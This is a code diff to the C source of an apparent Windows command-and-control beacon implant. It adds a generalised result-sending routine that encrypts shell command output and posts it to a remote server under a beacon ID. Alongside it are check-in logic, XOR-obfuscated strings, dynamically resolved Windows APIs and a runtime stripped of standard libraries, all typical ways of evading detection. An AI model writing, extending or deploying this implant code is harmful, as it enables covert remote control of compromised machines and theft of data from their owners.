@@ -1,6 +1,5 @@
+#include <winsock2.h>
 #include <windows.h>
-#include <string.h>
-#include <stdlib.h>
 #include "http.h"
 #include "crypto.h"
 #include "protocol.h"
@@ -8,6 +7,7 @@
 #include "obf.h"
 #include "obf_strings.h"
 #include "../../include/dynapi.h"
+#include "../../include/mini_std.h"
 
 /* g_whost is lazily initialized. Not thread-safe — call http_request at least
    once on the main thread before spawning any worker threads. */
@@ -150,22 +150,32 @@ int do_checkin(uint32_t beacon_id, uint8_t *out_buf, DWORD *out_len) {
 
 int send_result(uint32_t beacon_id, uint32_t label, uint16_t flags,
                 const char *output, const uint8_t session_key[32]) {
-    /* Build plaintext: TaskHeader(16) + RunRep(4 + output_len) */
     DWORD out_len = (DWORD)strlen(output);
-    if (out_len > 65536) out_len = 65536;
+    return send_result_typed(beacon_id, label, TASK_RUN, CODE_RUN_SHELL,
+                             flags, output, out_len, session_key);
+}
+
+int send_result_typed(uint32_t beacon_id, uint32_t label,
+                      uint8_t type, uint8_t code, uint16_t flags,
+                      const char *output, uint32_t output_len,
+                      const uint8_t session_key[32]) {
+    /* Build plaintext: TaskHeader(16) + RunRep(4 + output_len) */
+    DWORD out_len = output_len;
+    if (!output) out_len = 0;
+    if (out_len > (1U << 20)) out_len = (1U << 20);
     DWORD plain_len = 16 + 4 + out_len;
-    uint8_t *plain = (uint8_t *)malloc(plain_len);
+    uint8_t *plain = (uint8_t *)fnLocalAlloc(LPTR, plain_len);
     if (!plain) return -1;
 
     plain[16] = (uint8_t)(out_len & 0xFF);
     plain[17] = (uint8_t)((out_len >> 8) & 0xFF);
     plain[18] = (uint8_t)((out_len >> 16) & 0xFF);
     plain[19] = (uint8_t)((out_len >> 24) & 0xFF);
-    memcpy(plain + 20, output, out_len);
+    if (out_len > 0 && output) memcpy(plain + 20, output, out_len);
 
     task_header_t hdr = {
-        .type       = TASK_RUN,
-        .code       = CODE_RUN_SHELL,
+        .type       = type,
+        .code       = code,
         .flags      = flags,
         .label      = label,
         .identifier = 0,
@@ -174,21 +184,21 @@ int send_result(uint32_t beacon_id, uint32_t label, uint16_t flags,
     encode_header(&hdr, plain);
 
     /* Encrypt */
-    uint8_t *encrypted = (uint8_t *)malloc(plain_len + 64);
-    if (!encrypted) { free(plain); return -1; }
+    uint8_t *encrypted = (uint8_t *)fnLocalAlloc(LPTR, plain_len + 64);
+    if (!encrypted) { fnLocalFree(plain); return -1; }
     DWORD enc_len = plain_len + 64;
     if (aes_encrypt(session_key, plain, plain_len, encrypted, &enc_len) != 0) {
-        free(plain);
-        free(encrypted);
+        fnLocalFree(plain);
+        fnLocalFree(encrypted);
         return -1;
     }
-    free(plain);
+    fnLocalFree(plain);
 
     /* Body: beacon_id(4 bytes LE) + encrypted */
     DWORD body_len = 4 + enc_len;
-    uint8_t *body = (uint8_t *)malloc(body_len);
+    uint8_t *body = (uint8_t *)fnLocalAlloc(LPTR, body_len);
     if (!body) {
-        free(encrypted);
+        fnLocalFree(encrypted);
         return -1;
     }
     body[0] = (uint8_t)(beacon_id & 0xFF);
@@ -203,8 +213,8 @@ int send_result(uint32_t beacon_id, uint32_t label, uint16_t flags,
     char _post3[ENC_HTTP_POST_LEN + 1];
     xor_dec(_post3, ENC_HTTP_POST, ENC_HTTP_POST_LEN);
     int n = http_request(_post3, _path_res, body, body_len, resp, sizeof(resp));
-    free(body);
-    free(encrypted);
+    fnLocalFree(body);
+    fnLocalFree(encrypted);
     return (n >= 0) ? 0 : -1;
 }
 
